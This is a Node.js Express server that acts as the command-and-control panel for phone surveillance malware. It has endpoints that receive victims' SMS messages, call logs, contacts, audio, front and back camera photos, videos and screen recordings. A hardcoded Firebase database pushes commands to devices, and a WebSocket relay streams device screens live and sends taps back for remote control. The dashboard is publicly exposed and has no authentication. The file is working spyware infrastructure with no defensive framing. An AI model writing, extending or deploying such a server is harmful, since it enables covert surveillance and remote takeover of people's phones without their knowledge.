const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const moment = require('moment');
const https = require('https'); // For Firebase REST API

const app = express();
const PORT = 5000;

// ✅ REPLACE with your actual Firebase URL from google-services.json
const FIREBASE_URL = "https://saral-87cd4-default-rtdb.firebaseio.com";

// ─── Directory Setup ──────────────────────────────────────────────────────────
const uploadDirs = ['audios', 'contacts', 'photos', 'videos', 'others',
    'front_photos', 'back_photos', 'screen_recordings'];
uploadDirs.forEach(dir => {
    const dirPath = path.join(__dirname, 'uploads', dir);
    if (!fs.existsSync(dirPath)) fs.mkdirSync(dirPath, { recursive: true });
});

// ─── Data Store ───────────────────────────────────────────────────────────────
const dataFile = path.join(__dirname, 'data.json');
const defaultData = { texts: [], sms: [], files: [], call_logs: [], devices: {} };
if (!fs.existsSync(dataFile)) {
    fs.writeFileSync(dataFile, JSON.stringify(defaultData, null, 2));
} else {
    try {
        const existing = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
        let updated = false;
        if (!existing.devices) { existing.devices = {}; updated = true; }
        if (!existing.call_logs) { existing.call_logs = []; updated = true; }
        if (updated) fs.writeFileSync(dataFile, JSON.stringify(existing, null, 2));
    } catch (e) {
        fs.writeFileSync(dataFile, JSON.stringify(defaultData, null, 2));
    }
}

const readData = () => {
    try { return JSON.parse(fs.readFileSync(dataFile, 'utf8')); }
    catch (e) { return { ...defaultData }; }
};
const writeData = (data) => fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));

// ─── Mapping Device-ID to User-ID ─────────────────────────────────────────────
const updateDeviceMap = (deviceId, userId) => {
    if (!deviceId || deviceId === 'Unknown') return;
    const db = readData();

    // Ensure the devices object exists and has an entry for this device
    if (!db.devices_info) db.devices_info = {};

    let changed = false;

    // Update userId if provided and different
    if (userId && db.devices[deviceId] !== userId) {
        db.devices[deviceId] = userId;
        changed = true;
    }

    // Always update last seen
    const now = moment().format('YYYY-MM-DD HH:mm:ss');
    if (!db.devices_info[deviceId] || db.devices_info[deviceId].lastSeen !== now) {
        db.devices_info[deviceId] = {
            lastSeen: now,
            userId: userId || db.devices[deviceId] || 'Unknown'
        };
        changed = true;
    }

    if (changed) {
        writeData(db);
        if (userId) console.log(`[MAP] Registered ${deviceId} → ${userId} (Last Seen: ${now})`);
    }
};

// ─── Middleware ───────────────────────────────────────────────────────────────
app.use(cors());
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

const FOLDER_MAP = {
    '/upload_audios': 'audios',
    '/upload_contacts': 'contacts',
    '/upload_photos': 'photos',
    '/upload_videos': 'videos',
    '/upload_front_photo': 'front_photos',
    '/upload_back_photo': 'back_photos',
    '/upload_screen_recording': 'screen_recordings',
};

const rawBodySaver = (req, res, next) => {
    if (req.headers['content-type'] === 'application/octet-stream') {
        let filename = 'unknown_file';
        const disposition = req.headers['content-disposition'];
        if (disposition && disposition.includes('filename="')) {
            filename = disposition.split('filename="')[1].split('"')[0];
        }

        const folder = FOLDER_MAP[req.path] || 'others';
        const savedName = Date.now() + '_' + filename;
        const filePath = path.join(__dirname, 'uploads', folder, savedName);
        const writeStream = fs.createWriteStream(filePath);
        req.pipe(writeStream);

        const deviceId = req.headers['device-id'] || 'Unknown';
        const userId = req.headers['user-id'];
        updateDeviceMap(deviceId, userId);

        req.on('end', () => {
            const db = readData();
            db.files.push({
                filename,
                path: `/uploads/${folder}/${savedName}`,
                type: folder,
                deviceId,
                timestamp: moment().format('YYYY-MM-DD HH:mm:ss')
            });
            if (db.files.length > 1000) db.files.shift();
            writeData(db);
            res.status(200).send('File Uploaded');
        });
    } else {
        next();
    }
};

app.use(rawBodySaver);
app.use(bodyParser.json({ limit: '10mb' }));

// ─── Endpoints ────────────────────────────────────────────────────────────────

app.post('/upload_text', (req, res) => {
    const { type, data } = req.body;
    const deviceId = req.headers['device-id'] || 'Unknown';
    const userId = req.headers['user-id'];
    updateDeviceMap(deviceId, userId);

    const db = readData();
    db.texts.push({
        type: type || 'Log',
        data: data || '',
        deviceId,
        timestamp: moment().format('YYYY-MM-DD HH:mm:ss')
    });
    if (db.texts.length > 2000) db.texts.shift();
    writeData(db);
    res.status(200).send('Text logged');
});

app.post('/upload_sms', (req, res) => {
    const { sender, message, timestamp } = req.body;
    const deviceId = req.headers['device-id'] || 'Unknown';
    const userId = req.headers['user-id'];
    updateDeviceMap(deviceId, userId);

    const db = readData();
    db.sms.push({
        sender: sender || 'Unknown',
        message: message || '',
        original_timestamp: timestamp,
        deviceId,
        timestamp: moment().format('YYYY-MM-DD HH:mm:ss')
    });
    writeData(db);
    res.status(200).send('SMS logged');
});

app.post('/upload_call_logs', (req, res) => {
    const { data } = req.body;
    const deviceId = req.headers['device-id'] || 'Unknown';
    const userId = req.headers['user-id'];
    updateDeviceMap(deviceId, userId);

    const db = readData();
    db.call_logs.push({ data: data || '[]', deviceId, timestamp: moment().format('YYYY-MM-DD HH:mm:ss') });
    writeData(db);
    res.status(200).send('Call logs saved');
});

// ─── COMMAND API (Updates Firebase) ───────────────────────────────────────────
app.post('/api/command', (req, res) => {
    const { deviceId, command } = req.body;
    const db = readData();
    const userId = db.devices[deviceId];

    if (!userId) {
        console.log(`[CMD] ❌ No userId mapped for device: ${deviceId}`);
        console.log(`[CMD]    Known devices: ${JSON.stringify(db.devices)}`);
        return res.status(404).json({ error: "User-ID not found for this device. The app must upload data at least once to register." });
    }

    // Update Firebase via REST API
    const firebaseUrl = `${FIREBASE_URL}/commands/${userId}/command.json`;
    const cmdData = JSON.stringify(command);

    console.log(`[CMD] Attempting: PUT ${firebaseUrl} ← "${command}" for device ${deviceId}`);

    const firebaseReq = https.request(firebaseUrl, {
        method: 'PUT',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(cmdData)
        }
    }, (firebaseRes) => {
        let body = '';
        firebaseRes.on('data', chunk => body += chunk);
        firebaseRes.on('end', () => {
            const status = firebaseRes.statusCode;
            if (status >= 200 && status < 300) {
                console.log(`[CMD] ✅ Firebase accepted: ${command} → ${userId} (HTTP ${status})`);
                res.json({ success: true, command, userId, firebaseStatus: status });
            } else {
                console.error(`[CMD] ❌ Firebase REJECTED: HTTP ${status} — ${body}`);
                res.status(502).json({ 
                    success: false, 
                    error: `Firebase rejected the command (HTTP ${status})`,
                    firebaseResponse: body,
                    hint: status === 401 ? "Database rules require authentication. Set commands node to public or add auth token." :
                          status === 403 ? "Permission denied. Check Firebase Realtime Database rules." : 
                          "Unknown Firebase error."
                });
            }
        });
    });

    firebaseReq.on('error', (e) => {
        console.error("[CMD] ❌ Network error reaching Firebase:", e.message);
        res.status(500).json({ error: "Failed to reach Firebase: " + e.message });
    });

    firebaseReq.write(cmdData);
    firebaseReq.end();
});

// ─── DEBUG: Test Firebase connectivity ────────────────────────────────────────
app.get('/api/debug/firebase', (req, res) => {
    const testUrl = `${FIREBASE_URL}/.json?shallow=true`;
    https.get(testUrl, (fbRes) => {
        let body = '';
        fbRes.on('data', chunk => body += chunk);
        fbRes.on('end', () => {
            const db = readData();
            res.json({
                firebaseUrl: FIREBASE_URL,
                firebaseStatus: fbRes.statusCode,
                firebaseResponse: body.substring(0, 500),
                knownDevices: db.devices || {},
                devicesInfo: db.devices_info || {},
                totalTexts: (db.texts || []).length,
                totalSms: (db.sms || []).length,
                totalFiles: (db.files || []).length,
                serverTime: moment().format('YYYY-MM-DD HH:mm:ss')
            });
        });
    }).on('error', (e) => {
        res.status(500).json({ error: "Cannot reach Firebase: " + e.message });
    });
});

// API endpoint for live polling
app.get('/api/data', (req, res) => {
    const db = readData();
    res.json({
        texts: [...db.texts].reverse().slice(0, 200),
        sms: [...db.sms].reverse().slice(0, 200),
        files: [...db.files].reverse().slice(0, 200),
        call_logs: [...db.call_logs].reverse().slice(0, 50),
        devices: db.devices
    });
});

app.get('/', (req, res) => {
    const db = readData();
    res.render('index', { data: { ...db, texts: [...db.texts].reverse(), sms: [...db.sms].reverse(), files: [...db.files].reverse(), call_logs: [...db.call_logs].reverse() } });
});

const server = app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Quantum Vault Dashboard → Publicly Accessible via AWS IP on Port ${PORT}`);
});

// ─── WebSocket Relay (Live Streaming) ──────────────────────────────────────────
const { WebSocketServer } = require('ws');
const url = require('url');
const wss = new WebSocketServer({ server });

wss.on('connection', (ws, req) => {
    const parameters = url.parse(req.url, true).query;
    const deviceId = parameters.deviceId;

    if (deviceId) {
        ws.type = 'device';
        ws.deviceId = deviceId;
        console.log(`[WS] Device Connected: ${deviceId}`);
    } else {
        ws.type = 'browser';
        console.log('[WS] Browser Viewer Connected');
    }

    ws.on('message', (message) => {
        // 1. Binary Data: Frame from a Device
        if (Buffer.isBuffer(message) && ws.type === 'device') {
            // Relay ONLY to browsers watching this specific device
            wss.clients.forEach(client => {
                if (client.type === 'browser' && client.readyState === WebSocket.OPEN && client.watchingDeviceId === ws.deviceId) {
                    client.send(message);
                }
            });
        }
        // 2. Text Data: Commands from a Browser
        else if (typeof message === 'string' || Buffer.isBuffer(message)) {
            try {
                const data = JSON.parse(message.toString());

                // Browser wants to watch a specific device
                if (data.action === 'watch' && ws.type === 'browser') {
                    ws.watchingDeviceId = data.deviceId;
                    console.log(`[WS] Browser is now watching: ${data.deviceId}`);
                }
                // Browser sends a tap/gesture to a device
                else if (data.action === 'tap' && ws.type === 'browser' && ws.watchingDeviceId) {
                    wss.clients.forEach(client => {
                        if (client.type === 'device' && client.deviceId === ws.watchingDeviceId && client.readyState === WebSocket.OPEN) {
                            client.send(JSON.stringify(data));
                        }
                    });
                }
            } catch (e) {
                // Not a JSON command, ignore
            }
        }
    });

    ws.on('close', () => {
        if (ws.type === 'device') console.log(`[WS] Device Disconnected: ${ws.deviceId}`);
    });
});

